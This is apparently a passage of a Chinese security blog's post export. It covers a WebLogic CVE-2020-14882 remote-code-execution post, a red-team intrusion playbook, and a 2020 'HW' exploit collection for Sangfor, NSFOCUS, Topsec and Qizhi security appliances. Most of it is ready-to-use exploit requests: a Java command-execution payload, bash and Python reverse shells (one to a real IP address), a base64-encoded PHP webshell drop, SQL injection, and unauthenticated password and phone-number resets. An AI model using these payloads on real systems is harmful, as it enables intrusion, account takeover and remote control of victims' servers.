class="string">weblogic.work.WorkAdapter</span> adapter <span class="string">=</span> current<span class="keyword">T</span>hread.get<span class="keyword">C</span>urrent<span class="keyword">W</span>ork(); <span class="string">java.lang.reflect.Field</span> field <span class="string">=</span> adapter.get<span class="keyword">C</span>lass().get<span class="keyword">D</span>eclared<span class="keyword">F</span>ield("connection<span class="keyword">H</span>andler");field.set<span class="keyword">A</span>ccessible(true);<span class="keyword">O</span>bject <span class="string">obj</span> = <span class="string">field.get(adapter);weblogic.servlet.internal.ServletRequestImpl</span> req <span class="string">=</span> (weblogic.servlet.internal.<span class="keyword">S</span>ervlet<span class="keyword">R</span>equest<span class="keyword">I</span>mpl)obj.get<span class="keyword">C</span>lass().get<span class="keyword">M</span>ethod("get<span class="keyword">S</span>ervlet<span class="keyword">R</span>equest").invoke(obj); <span class="string">String</span> cmd <span class="string">=</span> req.get<span class="keyword">H</span>eader("cmd");<span class="keyword">S</span>tring[] <span class="string">cmds</span> = <span class="string">System.getProperty("os.name").toLowerCase().contains("window")</span> ? <span class="string">new</span> <span class="keyword">S</span>tring[]&#123;"cmd.exe", <span class="string">"/c",</span> cmd&#125; <span class="string">:</span> new <span class="string">String[]&#123;"/bin/sh",</span> "-c", <span class="string">cmd&#125;;if(cmd</span> != <span class="string">null</span> )&#123; <span class="string">String</span> result <span class="string">=</span> new <span class="string">java.util.Scanner(new</span> java.lang.<span class="keyword">P</span>rocess<span class="keyword">B</span>uilder(cmds).start().get<span class="keyword">I</span>nput<span class="keyword">S</span>tream()).use<span class="keyword">D</span>elimiter("\\<span class="keyword">A</span>").next(); <span class="string">weblogic.servlet.internal.ServletResponseImpl</span> res <span class="string">=</span> (weblogic.servlet.internal.<span class="keyword">S</span>ervlet<span class="keyword">R</span>esponse<span class="keyword">I</span>mpl)req.get<span class="keyword">C</span>lass().get<span class="keyword">M</span>ethod("get<span class="keyword">R</span>esponse").invoke(req);res.get<span class="keyword">S</span>ervlet<span class="keyword">O</span>utput<span class="keyword">S</span>tream().write<span class="keyword">S</span>tream(new <span class="string">weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();&#125;</span> current<span class="keyword">T</span>hread.interrupt();') <span class="string"></span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.116.140:7001</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">cmd</span>: systeminfo</span><br><span class="line"><span class="attribute">Cookie</span>: ADMINCONSOLESESSION=tSOINIrqWmn3G95L9cUbOsJSJgxgWQl-ORnhEIzSI-yzp5hb5TAD!1412943799; zentaosid=38b25c164f38b4f7f7bd66baf290a162</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201102171023696.png" alt="image-20201102171023696"></p><p>POST版</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/console/css/%252e%252e%252fconsole.portal</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.116.140:7001</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 1258</span><br><span class="line"><span class="attribute">cmd</span>: whoami</span><br><span class="line"></span><br><span class="line">_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();</span><br><span class="line">weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();</span><br><span class="line">java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");</span><br><span class="line"><span class="attribute">field.setAccessible(true);</span></span><br><span class="line">Object obj = field.get(adapter);</span><br><span class="line">weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj);</span><br><span class="line">String cmd = req.getHeader("cmd");</span><br><span class="line">String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]&#123;"cmd.exe", "/c", cmd&#125; : new String[]&#123;"/bin/sh", "-c", cmd&#125;;</span><br><span class="line">if (cmd != null) &#123;</span><br><span class="line">    String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();</span><br><span class="line">    weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);</span><br><span class="line">    res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));</span><br><span class="line">    res.getServletOutputStream().flush();</span><br><span class="line">    res.getWriter().write("");</span><br><span class="line">&#125;executeThread.interrupt();</span><br><span class="line">");</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201105111111101.png" alt="image-20201105111111101"></p><p>参考链接：</p><p><a href="https://mp.weixin.qq.com/s/48VIwTkyFVXUTS78kNByhg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/48VIwTkyFVXUTS78kNByhg</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> WebLogic </category>
          
          <category> 未授权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2020-14882 </tag>
            
            <tag> 未授权漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红队思路</title>
      <link href="2020/10/29/%E7%BA%A2%E9%98%9F%E6%80%9D%E8%B7%AF/"/>
      <url>2020/10/29/%E7%BA%A2%E9%98%9F%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<p>入口权限 =&gt; 内网搜集/探测 =&gt; 免杀提权=&gt; 抓取登录凭证 =&gt; 跨平台横向 =&gt; 入口维持 =&gt; 数据回传 =&gt; 定期权限维护</p><h4 id="撕口子"><a href="#撕口子" class="headerlink" title="撕口子"></a>撕口子</h4><p>信息收集：<a href="https://www.4hou.com/posts/n8qD" target="_blank" rel="noopener">https://www.4hou.com/posts/n8qD</a></p><p>1、nday RCE（常用的有Shiro、OA、fastjson、weblogic、solr等）/0day rce</p><p>2、（弱口令登录-&gt;）注册上传头像、上传图片、上传文件等处Getshell</p><p>3、VPN/wifi/安全设备/虚拟化桌面系统/邮件服务系统直接进入内网</p><p>4、社工/邮件钓鱼 -&gt; 员工PC做跳板进入内网</p><p>5、sql注入getshell</p><p>6、子公司/供应链 建立通道</p><h4 id="建立据点，维权"><a href="#建立据点，维权" class="headerlink" title="建立据点，维权"></a>建立据点，维权</h4><p>1、稳固据点：社工 多台PC</p><p>2、声东击西，主要针对蓝方封堵策略：针对一个网站做大量攻击 同时对另一个网站尽可能产生少流量的拿shell，搭建FRP、socks5多种协议的木马并备份。</p><h4 id="内网横向渗透-拿分重点"><a href="#内网横向渗透-拿分重点" class="headerlink" title="内网横向渗透-拿分重点"></a>内网横向渗透-拿分重点</h4><p>进入内网后，一般首先会对本机和内部网络进行信息收集。包括本机：网络配置及连接情况、翻文件、找命令执行历史记录、配置文件、数据库信息、管理员登录信息、总结密码规律、用户相关信息等；对内部网络/其它主机：存活IP、主机名、开放端口和服务等。利用收集到的信息主要针对未修复漏洞、弱点等来横向渗透扩大战果。</p><p>内网漫游可以重点关注<strong>邮件服务器、OA系统、版本控制服务器、集中运维管理平台、统一认证系统、域控</strong>等，尝试突破核心系统权限、核心业务和核心数据。</p><p>1、信息收集重点：查看磁盘文件、密码本、历史记录、浏览器记住密码、hashdump、端口扫描、C段扫描等等</p><p>2、寻找域控、寻找核心生产业务、堡垒机</p><p>3、MS17-010、CVE-2020-1742 windows拿权限利器</p><p>4、复用一套密码</p><h4 id="其它值得参考的思路文章（更新于12-27）："><a href="#其它值得参考的思路文章（更新于12-27）：" class="headerlink" title="其它值得参考的思路文章（更新于12.27）："></a>其它值得参考的思路文章（更新于12.27）：</h4><p><a href="https://www.freebuf.com/articles/network/256580.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/256580.html</a></p><p>奇安信蓝队视角下的防御体系突破</p>]]></content>
      
      
      <categories>
          
          <category> HW </category>
          
          <category> 红队 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020HW漏洞合集</title>
      <link href="2020/09/25/2020HW%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/"/>
      <url>2020/09/25/2020HW%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>持续整理中…</p><h2 id="一、安全设备"><a href="#一、安全设备" class="headerlink" title="一、安全设备"></a>一、安全设备</h2><h4 id="1、深信服-SSL-VPN-Nday-Pre-Auth-修改绑定手机"><a href="#1、深信服-SSL-VPN-Nday-Pre-Auth-修改绑定手机" class="headerlink" title="1、深信服 SSL VPN Nday - Pre Auth 修改绑定手机"></a>1、深信服 SSL VPN Nday - Pre Auth 修改绑定手机</h4><p><strong>描述：</strong><br>某VPN加密算法使用了默认的key,攻击者构利用key构造重置密码数据包从而修改任意用户的密码<br>M7.6.6R1版本key为20181118<br>M7.6.1key为20100720</p><p><strong>利用条件：</strong>需要登录账号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#计算RC4_STR_LEN脚本</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span>  a2b_hex</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myRC4</span><span class="params">(data,key)</span>:</span></span><br><span class="line">    rc41 = ARC4.new(key)</span><br><span class="line">    encrypted = rc41.encrypt(data)</span><br><span class="line">    <span class="keyword">return</span> encrypted.encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_decrpt_hex</span><span class="params">(data,key)</span>:</span></span><br><span class="line">    rc41 = ARC4.new(key)</span><br><span class="line">    <span class="keyword">return</span> rc41.decrypt(a2b_hex(data))</span><br><span class="line"></span><br><span class="line">key = <span class="string">'20100720'</span></span><br><span class="line">data = <span class="string">r',username=TARGET_USERNAME,ip=127.0.0.1,grpid=1,pripsw=suiyi,newpsw=TARGET_PASSWORD,'</span></span><br><span class="line">print(myRC4(data,key))</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">https://&lt;PATH&gt;/por/changepwd.csp</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line">...</span><br><span class="line">sessReq=clusterd&amp;sessid=0&amp;str=RC4_STR&amp;len=RC4_STR_LEN(脚本计算后结果)</span><br></pre></td></tr></table></figure><p><strong>参考</strong>：<a href="https://www.yuque.com/docs/share/ad8192ca-39ec-4950-86e9-01dfa989bf6f?#（密码：gf34）" target="_blank" rel="noopener">https://www.yuque.com/docs/share/ad8192ca-39ec-4950-86e9-01dfa989bf6f?#（密码：gf34）</a></p><h4 id="2、深信服-SSL-VPN-Nday-Pre-Auth-任意密码重置"><a href="#2、深信服-SSL-VPN-Nday-Pre-Auth-任意密码重置" class="headerlink" title="2、深信服 SSL VPN Nday - Pre Auth 任意密码重置"></a>2、深信服 SSL VPN Nday - Pre Auth 任意密码重置</h4><p><strong>描述：</strong>修改手机号接口未正确鉴权导致越权覆盖任意用户的手机号码</p><p><strong>利用条件：</strong>需要登录账号</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST https://&lt;PATH&gt;/por/changetelnum.csp?apiversion=1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line">...</span><br><span class="line">newtel=TARGET_PHONE&amp;sessReq=clusterd&amp;username=TARGET_USERNAME&amp;grpid=0&amp;sid=0&amp;ip=127.0.0.1</span><br></pre></td></tr></table></figure><p><strong>参考</strong>：<a href="https://www.yuque.com/docs/share/ad8192ca-39ec-4950-86e9-01dfa989bf6f?#（密码：gf34）" target="_blank" rel="noopener">https://www.yuque.com/docs/share/ad8192ca-39ec-4950-86e9-01dfa989bf6f?#（密码：gf34）</a></p><h4 id="3、深信服SSL-VPN-远程代码执行漏洞-CNVD-2020-48679"><a href="#3、深信服SSL-VPN-远程代码执行漏洞-CNVD-2020-48679" class="headerlink" title="3、深信服SSL VPN 远程代码执行漏洞 CNVD-2020-48679"></a>3、深信服SSL VPN 远程代码执行漏洞 CNVD-2020-48679</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.onebug.org&#x2F;websafe&#x2F;98922.html</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;potatsoSec&#x2F;p&#x2F;12326356.html</span><br></pre></td></tr></table></figure><h4 id="4、深信服-SSL-VPN-任意用户添加漏洞"><a href="#4、深信服-SSL-VPN-任意用户添加漏洞" class="headerlink" title="4、深信服 SSL VPN 任意用户添加漏洞"></a>4、深信服 SSL VPN 任意用户添加漏洞</h4><h4 id="5、深信服-EDR3-2-21远程代码执行"><a href="#5、深信服-EDR3-2-21远程代码执行" class="headerlink" title="5、深信服 EDR3.2.21远程代码执行"></a>5、深信服 EDR3.2.21远程代码执行</h4><figure class="highlight"><figcaption><span>EXP</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9【访问nginx规则路径，绕过第一个检查;&#123;"md5":true&#125;的base64编码，绕过第二个检查】</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.226.60</span><br><span class="line"><span class="attribute">Connection</span>: close </span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0  </span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0； Win64； x64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/85.0.4183.83Safari/537.36 </span><br><span class="line"><span class="attribute">Accept</span>: text/html, application/xhtml+xml, application/xml；q=0.9, image/avif,image/webp, image/apng，*/*;q=0.8,application/sign ed-exchange；v=b3；q=0.9 </span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span>: none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span>: navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span>: ?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span>: document</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">HTTP_Y_FORWARDED_FOR</span>: 192.168.226.1</span><br><span class="line"><span class="attribute">Content-Length</span>: 76 </span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">HTTP_Y_FORWARDED_FOR</span>: 192.168.226.1</span><br><span class="line"></span><br><span class="line">&#123;"params":"w=123\"'1234123'\"|bash -i &gt; /dev/tcp/167.179.118.219/8899 0&gt;&amp;1”&#125;</span><br></pre></td></tr></table></figure><p><strong>参考</strong>：<a href="https://www.cnblogs.com/0day-li/p/13650452.html" target="_blank" rel="noopener">https://www.cnblogs.com/0day-li/p/13650452.html</a></p><h4 id="6、深信服-EDR-任意用户登录漏洞-CNVD-2020-46552"><a href="#6、深信服-EDR-任意用户登录漏洞-CNVD-2020-46552" class="headerlink" title="6、深信服 EDR 任意用户登录漏洞 CNVD-2020-46552"></a>6、深信服 EDR 任意用户登录漏洞 CNVD-2020-46552</h4><p><strong>影响版本：</strong>EDR &lt;= v3.2.19</p><figure class="highlight plain"><figcaption><span>POC</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：https:&#x2F;&#x2F;ip:xx&#x2F;ui&#x2F;login.php?user&#x3D;任意用户名</span><br><span class="line">https:&#x2F;&#x2F;ip:xx&#x2F;ui&#x2F;login.php?user&#x3D;admin</span><br></pre></td></tr></table></figure><h4 id="7、深信服-EDR-远程命令执行漏洞"><a href="#7、深信服-EDR-远程命令执行漏洞" class="headerlink" title="7、深信服 EDR 远程命令执行漏洞"></a>7、深信服 EDR 远程命令执行漏洞</h4><p><strong>影响版本：</strong>深信服EDR 3.2.16；深信服EDR 3.2.17；深信服EDR 3.2.19</p><figure class="highlight"><figcaption><span>EXP</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">POC：</span></span><br><span class="line">https://XXX/tool/log/c.php?strip_slashes=system&amp;limit=whoami</span><br><span class="line">https://XXX/tool/log/c.php?strip_slashes=system&amp;host=whoami</span><br><span class="line">https://XXX/tool/log/c.php?strip_slashes=system&amp;path=whoami</span><br><span class="line">https://XXX/tool/log/c.php?strip_slashes=system&amp;row=whoami</span><br><span class="line"></span><br><span class="line">反弹Shell:</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/tool/log/c.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: x.x.x.x</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.81 Safari/537.36 SE 2.X MetaSr 1.0</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded;charset=utf-8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=b1464478cad68327229d8f46e60d0a08; _ga=GA1.4.112365795.1597799903; _gid=GA1.4.1225783590.1597799903</span><br><span class="line"><span class="attribute">Content-Length</span>: 256</span><br><span class="line"></span><br><span class="line">strip_slashes=system&amp;host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><br></pre></td></tr></table></figure><h4 id="8、绿盟UTS综合威胁探针管理员任意登录-密码泄露"><a href="#8、绿盟UTS综合威胁探针管理员任意登录-密码泄露" class="headerlink" title="8、绿盟UTS综合威胁探针管理员任意登录/密码泄露"></a>8、绿盟UTS综合威胁探针管理员任意登录/密码泄露</h4><p><strong>影响版本：</strong>UTS &lt; V2.0R00F02SP03</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POC步骤：</span><br><span class="line">访问页面，随意输入用户名admin密码XXX，获取响应</span><br><span class="line">将相应的stauts字段false改为true可获取admin的md5值password</span><br><span class="line">利用md5作为password字段修改最初的包再去登录</span><br></pre></td></tr></table></figure><p><strong>参考</strong>：<a href="https://www.cnblogs.com/0day-li/p/13650550.html" target="_blank" rel="noopener">https://www.cnblogs.com/0day-li/p/13650550.html</a></p><h4 id="9、天融信TOPApp-LB负载均衡SQL注入漏洞"><a href="#9、天融信TOPApp-LB负载均衡SQL注入漏洞" class="headerlink" title="9、天融信TOPApp-LB负载均衡SQL注入漏洞"></a>9、天融信TOPApp-LB负载均衡SQL注入漏洞</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/acc/clsf/report/datasource.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host:xxxx.com</span></span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Accept</span>: text/javascript, text/html, application/xml, text/xml, */*</span><br><span class="line"><span class="attribute">X-Prototype-Version</span>: 1.6.0.3</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span>: same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span>: cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span>: empty</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=ijqtopbcbmu8d70o5t3kmvgt57</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 201</span><br><span class="line"></span><br><span class="line">t=l&amp;e=0&amp;s=t&amp;l=1&amp;vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22--+&amp;gid=0&amp;lmt=10&amp;o=r_Speed&amp;asc=false&amp;p=8&amp;lipf=&amp;lipt=&amp;ripf=&amp;ript=&amp;dscp=&amp;proto=&amp;lpf=&amp;lpt=&amp;rpf=&amp;rpt=</span><br></pre></td></tr></table></figure><h4 id="10、天融信数据防泄漏系统未授权修改管理员密码"><a href="#10、天融信数据防泄漏系统未授权修改管理员密码" class="headerlink" title="10、天融信数据防泄漏系统未授权修改管理员密码"></a>10、天融信数据防泄漏系统未授权修改管理员密码</h4><p><strong>描述：</strong></p><p>无需登录权限,由于修改密码处未校验原密码,且/?module=auth_user&amp;action=mod_edit_pwd。接口未授权访问,造成直接修改任意用户密码。:默认superman账户uid为1。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /?module=auth_user&amp;action=mod_edit_pwd http/1.1</span><br><span class="line"><span class="attribute">Cookie</span>: username=superman;</span><br><span class="line"></span><br><span class="line">uid=1&amp;pd=Newpasswd&amp;mod_pwd=1&amp;dlp_perm=1</span><br></pre></td></tr></table></figure><p><strong>参考</strong>：<a href="https://www.secpulse.com/archives/140809.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/140809.html</a></p><p>其它漏洞：<a href="https://blog.csdn.net/Adminxe/article/details/108744908" target="_blank" rel="noopener">https://blog.csdn.net/Adminxe/article/details/108744908</a></p><h4 id="11、网御星云VPN老版本漏洞"><a href="#11、网御星云VPN老版本漏洞" class="headerlink" title="11、网御星云VPN老版本漏洞"></a>11、网御星云VPN老版本漏洞</h4><h4 id="12、齐治堡垒机前台远程命令执行漏洞-CVND-2019-20835"><a href="#12、齐治堡垒机前台远程命令执行漏洞-CVND-2019-20835" class="headerlink" title="12、齐治堡垒机前台远程命令执行漏洞 CVND-2019-20835"></a>12、齐治堡垒机前台远程命令执行漏洞 CVND-2019-20835</h4><p><strong>漏洞利用：</strong>fofa_dork: ‘body=”齐治科技”‘，一般通过VPN访问，互联网不能直接访问<br><strong>利用条件：</strong>无需登录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">假设10.20.10.11为黑客可控的服务器，listener&#x2F;cluster_manage.php文件的内容为“&lt;?php echo ‘OK’;&gt;”</span><br><span class="line">1、访问 http:&#x2F;&#x2F;10.20.10.11&#x2F;listener&#x2F;cluster_manage.php  :返回 &quot;OK&quot;.</span><br><span class="line">2、访问如下链接即可getshell，执行成功后，生成PHP一句话马（echo &#39;&lt;?php @eval($_REQUEST[10086]);?&gt;&#39;&gt;&gt;&#x2F;var&#x2F;www&#x2F;shterm&#x2F;resources&#x2F;qrcode&#x2F;lbj77.php）</span><br><span class="line">https:&#x2F;&#x2F;10.20.10.10&#x2F;ha_request.php?action&#x3D;install&amp;ipaddr&#x3D;10.20.10.11&amp;node_id&#x3D;1$&#123;IFS&#125;|&#96;echo$&#123;IFS&#125;&quot; ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK&quot;|base64$&#123;IFS&#125;- d|bash&#96;|$&#123;IFS&#125;|echo$&#123;IFS&#125;</span><br><span class="line">3、&#x2F;var&#x2F;www&#x2F;shterm&#x2F;resources&#x2F;qrcode&#x2F;lbj77.php  密码10086</span><br><span class="line"></span><br><span class="line">备注：ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK就是echo &#39;&lt;?php @eval($_REQUEST[10086]);?&gt;&#39;&gt;&gt;&#x2F;var&#x2F;www&#x2F;shterm&#x2F;resources&#x2F;qrcode&#x2F;lbj77.php的base64加密后的结果</span><br><span class="line"></span><br><span class="line">据说还是另外一个版本是java的。</span><br><span class="line">POST &#x2F;shterm&#x2F;listener&#x2F;tui_update.php</span><br><span class="line"></span><br><span class="line">a&#x3D;[&quot;t&#39;;import os;os.popen(&#39;whoami&#39;)#&quot;]</span><br></pre></td></tr></table></figure><p><strong>参考</strong>：<a href="https://www.secpulse.com/archives/140809.html" 